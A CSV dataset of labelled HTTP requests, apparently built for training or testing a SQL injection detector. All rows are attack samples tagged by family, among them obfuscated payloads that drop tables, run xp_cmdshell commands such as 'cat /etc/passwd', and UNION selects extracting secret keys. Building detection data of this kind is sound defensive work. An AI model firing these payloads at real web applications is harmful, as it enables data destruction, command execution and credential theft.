time,source_ip,host,method,uri,user_agent,request_body,referer,flow_uid,dup_index,session_id,session_seq,label,attack_family,obfuscated,synthetic_duplicate,forced_unique_nonce,TEMP_benign_augmentation,aug_category
2023-07-08T22:45:45Z,137.216.135.96,37.85.58.9:80,GET,/browse?name=4983; DROP TABLE logs/**/,sqlmap/1.7.11#stable (http://sqlmap.org),,https://www.google.com/,a_CyhELm7qXDUbe8HM5,0,a0431481e48a,4,1,stacked_query,False,False,False,,
2023-07-15T18:15:40Z,161.132.108.214,37.85.58.9:80,GET,"/search?redirect="";/**/eXEc/**/xp_cmDsHElL('lS/**/-La')/*x*/","Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",,,a_CBxYwkwZ7QOCy425g,0,fd4081d9b7cf,5,1,stacked_query,True,False,False,,
2023-07-10T04:48:57Z,104.83.80.53,37.85.58.9:80,POST,/signin,"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36","username=8748"" ORDER BY 3#&password=x",https://www.bing.com/,a_C6GHwt20N7LQbF10hh,0,0437664bf8d7,5,1,error_based,False,False,False,,
2023-07-15T18:16:29Z,117.27.128.238,37.85.58.9:80,GET,"/lookup?q="" AND UPDATEXML(1,CONCAT(0x7e,(SELECT VERSION()),0x7e),1)-- comment",Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,,-,a_CCgB0frZ3U9y5YXW3,0,48868df77119,4,1,error_based,True,False,False,,
2023-08-15T22:32:54Z,141.94.222.8,37.85.58.9:80,GET,/redirect?search=oPERAtoR91'--,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://www.bing.com/,a_C3GLQ71HJatGB2dKda,0,3d9c8496db09,6,1,auth_bypass,True,False,False,,
2023-07-10T04:13:24Z,158.67.185.111,37.85.58.9:80,POST,/admin/login.php,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",username=7603' OR 'x'='x'#&password=x,https://www.bing.com/,a_Ck8CDpAa4Bff0IA7l,0,7020e8dc40a9,9,1,tautology,False,False,False,,
2023-07-10T04:13:16Z,158.67.185.111,37.85.58.9:80,POST,/portal/login,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",username=OPeraTOr'--&password=x,,a_Cc9QXt4K9E2jLAhUQ3,0,7020e8dc40a9,10,1,auth_bypass,True,False,False,,
2023-07-17T03:54:51Z,197.112.31.83,37.85.58.9:80,POST,/account/login,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",username='; EXEC xp_cmdshell('cat /etc/passwd')--&password=x,,a_CgHDtn2AjtzXUzdHR8,0,24ea6fe19031,6,1,stacked_query,False,False,False,,
2023-07-08T22:45:45Z,137.216.135.96,37.85.58.9:80,GET,/browse?redirect=6222' AND SLEEP(4)/**/,sqlmap/1.7.11#stable (http://sqlmap.org),,https://www.bing.com/,a_CYO66B10URDrenwsL7,0,a0431481e48a,5,1,time_based_blind,False,False,False,,
2023-07-08T22:45:45Z,137.216.135.96,37.85.58.9:80,POST,/signin,sqlmap/1.7.11#stable (http://sqlmap.org),"username=""/**/UNION/**/SELECT/**/role,permissions/**/FROM/**/transactions--&password=x",https://www.bing.com/,a_C8NVhN28KGnDkkxKR9,0,a0431481e48a,6,1,union_based,True,False,False,,
2023-07-17T03:54:49Z,197.112.31.83,37.85.58.9:80,GET,"/product?id=20"" AND 20=20/**/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,https://www.google.com/,a_CCEvYXoSFF9JFRtBf,0,24ea6fe19031,7,1,boolean_blind,False,False,False,,
2023-07-17T18:20:42Z,210.229.153.174,37.85.58.9:80,POST,/api/auth,"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36","username="" AND 7=CAST((SELECT @@version) AS int)#&password=x",,a_CzMewx3JshbHL4TvAg,0,cc3b1458adb0,2,1,error_based,False,False,False,,
2023-08-15T22:33:25Z,141.94.222.8,37.85.58.9:80,POST,/admin/login.php,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",username='; eXEC xP_CmdsheLL('iPCONfig')-- COMMEnT&password=x,-,a_Cz66OA4mTE8xAPKrOc,0,3d9c8496db09,7,1,stacked_query,True,False,False,,
2023-08-15T06:12:46Z,97.50.240.188,37.85.58.9:80,GET,"/filter?term="" anD sLEEP(2)/*X*/","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,-,a_CLdEcU2kMwNtVICJnl,0,c4463e9f2128,9,1,time_based_blind,True,False,False,,
2023-07-15T23:27:44Z,13.206.210.252,37.85.58.9:80,POST,/login,python-requests/2.31.0,"username="" AND EXTRACTVALUE(6,CONCAT(0x7e,(SELECT @@version)))-- -&password=x",https://www.google.com/,a_C6soUN3zamX7ozZiDl,0,64a5d991f585,2,1,error_based,False,False,False,,
2023-07-10T21:03:27Z,208.36.106.47,37.85.58.9:80,GET,"/catalog?query=""%20WAITFOR%20DELAY%20%270:0:03%27--%20-","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://duckduckgo.com/,a_C53aTp1MlQSv1EjGHc,0,158f8836e478,1,1,time_based_blind,True,False,False,,
2023-08-15T22:32:46Z,141.94.222.8,37.85.58.9:80,POST,/portal/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",username=1525%27%20WAITFOR%20DELAY%20%270:0:03%27--%20-&password=x,https://www.bing.com/,a_CF90yy25dOEQPYJH4i,0,3d9c8496db09,8,1,time_based_blind,True,False,False,,
2023-07-17T03:54:47Z,197.112.31.83,37.85.58.9:80,POST,/portal/login,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",username=' OR 1=1#&password=x,https://www.bing.com/,a_CjZE0E2J1cfspclZd7,0,24ea6fe19031,8,1,tautology,False,False,False,,
2023-07-08T22:45:45Z,137.216.135.96,37.85.58.9:80,GET,"/api/items?ref=13"" AND 13=13-- comment",sqlmap/1.7.11#stable (http://sqlmap.org),,https://www.google.com/,a_CLDPCd3pO57gRWWyhi,0,a0431481e48a,7,1,boolean_blind,True,False,False,,
2023-08-10T09:55:59Z,66.78.231.196,37.85.58.9:80,POST,/admin/login.php,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",username=' waiTFor DeLaY '0:0:04'-- -&password=x,,a_CTsOwe3E4rqk16uvoe,0,007e5f812bc1,1,1,time_based_blind,True,False,False,,
2023-08-13T15:54:50Z,44.214.106.171,37.85.58.9:80,POST,/account/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",username=admin'/*x*/&password=x,https://www.google.com/,a_CmN9uItzjtlPp0DZf,0,1dbafeff5892,7,1,auth_bypass,False,False,False,,
2023-07-15T18:15:58Z,161.132.108.214,37.85.58.9:80,GET,"/lookup?term="" AND SLEEP(12)#","Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",,-,a_CprYvF2ge6NPoUIZdh,0,fd4081d9b7cf,6,1,time_based_blind,False,False,False,,
2023-08-15T22:33:33Z,141.94.222.8,37.85.58.9:80,GET,/redirect?q=' AND SLEEP(8)#,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,,a_CHpgpu37BCgTXJx10e,0,3d9c8496db09,9,1,time_based_blind,True,False,False,,
2023-07-16T21:57:41Z,77.171.204.128,37.85.58.9:80,GET,/api/items?ref='/**/WAITFOR/**/DELAY/**/'0:0:09'/**/,python-requests/2.31.0,,https://duckduckgo.com/,a_CWi7Xe407yoA3Y3lGa,0,3a3756ce2645,1,1,time_based_blind,True,False,False,,
2023-08-15T06:13:05Z,97.50.240.188,37.85.58.9:80,POST,/signin,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",username=1021' WAITFOR DELAY '0:0:09'/*x*/&password=x,,a_Cx1vWG3oqoh9PdnFfa,0,c4463e9f2128,10,1,time_based_blind,False,False,False,,
2023-07-10T04:13:17Z,158.67.185.111,37.85.58.9:80,GET,/redirect?id=3185;%20droP%20Table%20lOgs/*X*/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,https://duckduckgo.com/,a_CKu4az2bOauk7M5W94,0,7020e8dc40a9,11,1,stacked_query,True,False,False,,
2023-08-13T15:56:01Z,129.136.206.117,37.85.58.9:80,POST,/portal/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username=8369""/**/wAITFor/**/DELAy/**/'0:0:10'--/**/COmMeNT&password=x",https://www.bing.com/,a_CbtYeG2kHnR36SpDe1,0,91095dbc12a5,3,1,time_based_blind,True,False,False,,
2023-07-15T18:15:53Z,161.132.108.214,37.85.58.9:80,GET,"/catalog?id=9366"" OR '1'='1'-- comment","Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",,https://www.google.com/,a_CVm5Ij1BYJwfOL0kY1,0,fd4081d9b7cf,7,1,tautology,False,False,False,,
2023-08-13T15:55:53Z,44.214.106.171,37.85.58.9:80,POST,/portal/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",username=5753; DROP TABLE employees#&password=x,-,a_CZQ7BCgskYCMn0xq4,0,1dbafeff5892,8,1,stacked_query,False,False,False,,
2023-07-10T12:14:33Z,124.204.242.186,37.85.58.9:80,POST,/signin,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",username=test'-- comment&password=x,,a_CTVbIb2LpBaf4qQRCd,0,afcb15864799,1,1,auth_bypass,False,False,False,,
2023-08-13T15:55:56Z,44.214.106.171,37.85.58.9:80,POST,/account/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username=%27%20AND%20UPDATEXML(1,CONCAT(0x7e,(SELECT%20VERSION()),0x7e),1)--%20comment&password=x",,a_CGPt3a3e9VQnpAoKK3,0,1dbafeff5892,9,1,error_based,True,False,False,,
2023-08-13T15:55:40Z,44.214.106.171,37.85.58.9:80,POST,/account/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",username=5480/**/oR/**/z=Z#&password=x,https://duckduckgo.com/,a_CDEUEs4Rw4EF9ydsK3,0,1dbafeff5892,10,1,tautology,True,False,False,,
2023-07-10T20:49:32Z,38.181.98.221,37.85.58.9:80,POST,/admin/login.php,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",username='; EXEC xp_cmdshell('ipconfig')-- -&password=x,https://duckduckgo.com/,a_CTGktuU1pLaKs5wz1,0,4b46762b0f4b,1,1,stacked_query,True,False,False,,
2023-07-17T03:54:26Z,197.112.31.83,37.85.58.9:80,POST,/login,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",username=rOoT35'--&password=x,-,a_COsOjW2dp7EtVPSbj,0,24ea6fe19031,9,1,auth_bypass,True,False,False,,
2023-07-17T03:54:32Z,197.112.31.83,37.85.58.9:80,POST,/api/auth,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",username=3607; DROP TABLE orders/**/&password=x,,a_CrLOT51eczc0A9VDE6,0,24ea6fe19031,10,1,stacked_query,False,False,False,,
2023-08-13T15:55:15Z,44.214.106.171,37.85.58.9:80,GET,"/filter?search=10"" And 10=10--","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://www.google.com/,a_CSZQKZ2J5ckLm8g3o7,0,1dbafeff5892,11,1,boolean_blind,True,False,False,,
2023-07-15T22:16:15Z,8.83.95.206,37.85.58.9:80,POST,/signin,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username="" WAITFOR DELAY '0:0:12'/**/&password=x",,a_C2MzID4Ibf4zr3Dyb6,0,6c06730a2c63,1,1,time_based_blind,False,False,False,,
2023-08-15T06:13:14Z,97.50.240.188,37.85.58.9:80,POST,/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username='/**/UNION/**/SELECT/**/NULL,NULL,NULL,NULL/**/&password=x",-,a_CRRxAWROg8af1R9Xd,0,c4463e9f2128,11,1,union_based,True,False,False,,
2023-07-15T23:27:44Z,13.206.210.252,37.85.58.9:80,GET,"/api/items?query=' Union SeLeCT null,Null,nULL,nUlL,NUll,nuLl,null,nUlL-- -",python-requests/2.31.0,,-,a_CDAvhu4sZZjfboc7Gi,0,64a5d991f585,3,1,union_based,True,False,False,,
2023-07-15T18:16:21Z,117.27.128.238,37.85.58.9:80,POST,/login,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,"username="" WAITFOR DELAY '0:0:04'/*x*/&password=x",https://www.google.com/,a_C75RRW11uBWLKHGwB9,0,48868df77119,5,1,time_based_blind,True,False,False,,
2023-07-14T22:28:11Z,100.54.173.137,37.85.58.9:80,GET,"/api/items?query='/**/UNION/**/SELECT/**/name,secret_key/**/FROM/**/accounts#",Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,,https://duckduckgo.com/,a_CXVQZx32AOvAOC7wbd,0,ab2b928a7098,1,1,union_based,True,False,False,,
2023-07-16T02:17:59Z,110.147.12.25,37.85.58.9:80,POST,/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",username=' ANd slEEp(10)/**/&password=x,https://www.bing.com/,a_CjZH0w1iTFfhYULZL8,0,59d1871631cb,1,1,time_based_blind,True,False,False,,
2023-07-15T18:16:05Z,117.27.128.238,37.85.58.9:80,POST,/login,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,username=admin'#&password=x,https://duckduckgo.com/,a_CBOkbb1cCjSHbkJSmf,0,48868df77119,6,1,auth_bypass,False,False,False,,
2023-08-15T06:12:59Z,97.50.240.188,37.85.58.9:80,POST,/account/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",username=1306 oR 1=1/**/&password=x,https://www.bing.com/,a_CytFsc16JR6nw9DOLl,0,c4463e9f2128,12,1,tautology,True,False,False,,
2023-07-17T03:54:43Z,197.112.31.83,37.85.58.9:80,POST,/account/login,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",username=971; DROP TABLE orders#&password=x,,a_CjH1FD2m5Gpb1vgUJk,0,24ea6fe19031,11,1,stacked_query,False,False,False,,
2023-07-15T22:38:48Z,94.12.105.219,37.85.58.9:80,GET,/api/items?name=%27%20Or%20a=a--,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,,,a_CrtSJY3jD4Y1XF8D3l,0,ff4b6ba9e33d,2,1,tautology,True,False,False,,
2023-07-10T04:49:39Z,104.83.80.53,37.85.58.9:80,GET,"/lookup?redirect=5950"" oRDER by 25--","Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36",,,a_CY5Ysx2Kb8D0fB0qzl,0,0437664bf8d7,6,1,error_based,True,False,False,,
2023-07-15T18:16:05Z,117.27.128.238,37.85.58.9:80,GET,/filter?q=5668 or YEs=yes-- -,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,,,a_ChWV1huBgz9m2jGj4,0,48868df77119,7,1,tautology,True,False,False,,
2023-08-13T15:55:36Z,44.214.106.171,37.85.58.9:80,GET,/lookup?redirect=8579; DROP TABLE admin--,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,,a_CFihpVdSeQoZ501Kg,0,1dbafeff5892,12,1,stacked_query,False,False,False,,
2023-07-15T18:15:22Z,161.132.108.214,37.85.58.9:80,GET,"/browse?term="" AND EXTRACTVALUE(8,CONCAT(0x7e,(SELECT @@version)))-- -","Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",,https://duckduckgo.com/,a_C7F7Lz3gOAFjFK9Pkf,0,fd4081d9b7cf,8,1,error_based,False,False,False,,
2023-08-13T15:55:24Z,44.214.106.171,37.85.58.9:80,GET,"/product?name=""/**/UNION/**/SELECT/**/NULL,NULL,NULL,NULL,NULL/**/","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,-,a_C9k88c1htGz8Gw8Um2,0,1dbafeff5892,13,1,union_based,True,False,False,,
2023-07-17T03:54:29Z,197.112.31.83,37.85.58.9:80,POST,/signin,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",username=administrator'/**/&password=x,,a_CLnxA92dh3qhkwHas5,0,24ea6fe19031,12,1,auth_bypass,False,False,False,,
2023-07-16T02:17:55Z,110.147.12.25,37.85.58.9:80,POST,/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username=2291"" WAITFOR DELAY '0:0:20'-- -&password=x",https://duckduckgo.com/,a_CMmEw81jeFWSER64m,0,59d1871631cb,2,1,time_based_blind,False,False,False,,
2023-07-15T00:25:15Z,86.226.220.211,37.85.58.9:80,POST,/signin,"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",username=support35'/*x*/&password=x,,a_CProdN3EKKK1WXgUac,0,29f3f4a01035,1,1,auth_bypass,False,False,False,,
2023-07-15T18:16:41Z,117.27.128.238,37.85.58.9:80,GET,/product?id=root'-- -,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0,,https://www.google.com/,a_CYU1ynJtKvp0IwFT8,0,48868df77119,8,1,auth_bypass,False,False,False,,
2023-08-15T22:33:00Z,141.94.222.8,37.85.58.9:80,GET,/search?q=sysadmin30'/**/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,,a_CRIvY3YmDVj2rPdN6,0,3d9c8496db09,10,1,auth_bypass,False,False,False,,
2023-08-15T06:13:09Z,97.50.240.188,37.85.58.9:80,POST,/signin,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",username=5642; DROP TABLE employees/*x*/&password=x,https://www.google.com/,a_CU6HHf4r6emBgpvcc3,0,c4463e9f2128,13,1,stacked_query,False,False,False,,
2023-07-10T04:49:18Z,104.83.80.53,37.85.58.9:80,POST,/api/auth,"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36","username=' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL/*x*/&password=x",-,a_CURjA3nrxuL31LXy5,0,0437664bf8d7,7,1,union_based,False,False,False,,
2023-08-15T06:13:57Z,97.50.240.188,37.85.58.9:80,GET,/browse?redirect=6943; DROP TABLE logs#,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,,a_CC2YA41B6oq45cGqtj,0,c4463e9f2128,14,1,stacked_query,False,False,False,,
2023-07-15T18:15:23Z,161.132.108.214,37.85.58.9:80,GET,/search?name=8165' OR 'yes'='yes'#,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",,https://www.bing.com/,a_Cbp6oD1qJ5EEqp7dk5,0,fd4081d9b7cf,9,1,tautology,False,False,False,,
2023-08-13T15:55:45Z,44.214.106.171,37.85.58.9:80,GET,"/search?search=' AND EXTRACTVALUE(6,CONCAT(0x7e,(SELECT @@version)))--","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://www.bing.com/,a_CwX6nL3EWvDRBVkAbh,0,1dbafeff5892,14,1,error_based,False,False,False,,
2023-07-10T04:48:52Z,104.83.80.53,37.85.58.9:80,GET,/product?ref=test25'-- comment,"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36",,https://www.google.com/,a_CB9YwR3KWbnrK9eFP3,0,0437664bf8d7,8,1,auth_bypass,False,False,False,,
2023-07-10T04:48:41Z,104.83.80.53,37.85.58.9:80,GET,/filter?ref=superuser38'/*x*/,"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36",,-,a_Cee8Av4CBoBefPAdkg,0,0437664bf8d7,9,1,auth_bypass,True,False,False,,
2023-07-17T03:53:57Z,200.49.71.103,37.85.58.9:80,GET,"/api/items?query=19"" AND 19=19/**/","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://duckduckgo.com/,a_Cbxoyk3t66Wk5Bow9a,0,ccdd86bc3838,4,1,boolean_blind,False,False,False,,
2023-08-15T22:33:43Z,141.94.222.8,37.85.58.9:80,POST,/portal/login,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",username=9' AND 9=9#&password=x,https://www.google.com/,a_CIjsXY1JID3qGjV84e,0,3d9c8496db09,11,1,boolean_blind,False,False,False,,
2023-08-13T15:55:14Z,44.214.106.171,37.85.58.9:80,GET,/catalog?term=8288; DROP TABLE orders-- -,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,-,a_CoNwfo2I4irDxWLes4,0,1dbafeff5892,15,1,stacked_query,False,False,False,,
2023-07-10T04:49:24Z,104.83.80.53,37.85.58.9:80,GET,/redirect?ref='; EXEC xp_cmdshell('ipconfig')#,"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36",,https://www.google.com/,a_CrQNWg4wADhBF2MhDh,0,0437664bf8d7,10,1,stacked_query,True,False,False,,
2023-08-10T08:37:21Z,36.36.102.231,37.85.58.9:80,GET,/filter?search=17' aND 17=17--,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",,https://www.bing.com/,a_CqhB1i1vv54aO14Wh5,0,eb8b8d63d6b0,1,1,boolean_blind,True,False,False,,
2023-08-15T22:33:07Z,141.94.222.8,37.85.58.9:80,GET,"/filter?redirect=' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL/**/","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,-,a_C8Z6SE4iIb8FV0bsni,0,3d9c8496db09,12,1,union_based,True,False,False,,
2023-07-10T04:12:40Z,158.67.185.111,37.85.58.9:80,POST,/portal/login,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",username=474; DROP TABLE orders#&password=x,https://www.bing.com/,a_CAjPFQ2M3o8LXsMrT3,0,7020e8dc40a9,12,1,stacked_query,False,False,False,,
2023-07-08T22:45:45Z,137.216.135.96,37.85.58.9:80,GET,"/browse?search=' AND 5=CONVERT(int,(SELECT @@version))-- comment",sqlmap/1.7.11#stable (http://sqlmap.org),,,a_CjXOQf4ObCb95lZJbk,0,a0431481e48a,8,1,error_based,False,False,False,,
2023-08-15T06:13:19Z,97.50.240.188,37.85.58.9:80,GET,/lookup?name='/**/WAITFOR/**/DELAY/**/'0:0:04'/*x*/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,,a_ChPT0s3blt2lOZFGf5,0,c4463e9f2128,15,1,time_based_blind,True,False,False,,
2023-07-17T03:54:17Z,197.112.31.83,37.85.58.9:80,POST,/portal/login,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15","username="" UNION SELECT id,email FROM logs#&password=x",-,a_CrABeL19QW1hsQD1mj,0,24ea6fe19031,13,1,union_based,False,False,False,,
2023-08-13T15:56:05Z,129.136.206.117,37.85.58.9:80,POST,/admin/login.php,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","username=27"" AND 27=27/**/&password=x",,a_CbZA2D4gP9BOI4A2A2,0,91095dbc12a5,4,1,boolean_blind,False,False,False,,
